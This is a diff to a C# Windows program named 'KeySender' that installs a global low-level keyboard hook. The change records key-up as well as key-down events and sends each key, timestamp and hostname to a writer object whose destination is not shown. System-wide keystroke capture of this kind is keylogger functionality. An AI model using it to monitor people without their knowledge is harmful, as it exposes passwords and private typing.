@@ -11,6 +11,7 @@ namespace KeySender
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
@@ -35,12 +36,21 @@ namespace KeySender
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string time = DateTime.Now.ToString();
-                var p = $"{Convert.ToInt32(PackageType.Pressed)};{(Keys)vkCode};{time};{System.Net.Dns.GetHostName()}";
-                SingletonWriter.Instance.Write(p);
+                if (wParam == (IntPtr)WM_KEYUP)
+                {
+                    var p = $"{Convert.ToInt32(PackageType.Pressed)};{(Keys)vkCode};{time};{System.Net.Dns.GetHostName()};Up";
+                    SingletonWriter.Instance.Write(p);
+                }
+                else if (wParam == (IntPtr)WM_KEYDOWN)
+                {
+                    var p = $"{Convert.ToInt32(PackageType.Pressed)};{(Keys)vkCode};{time};{System.Net.Dns.GetHostName()};Down";
+                    SingletonWriter.Instance.Write(p);
+                }
+                
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
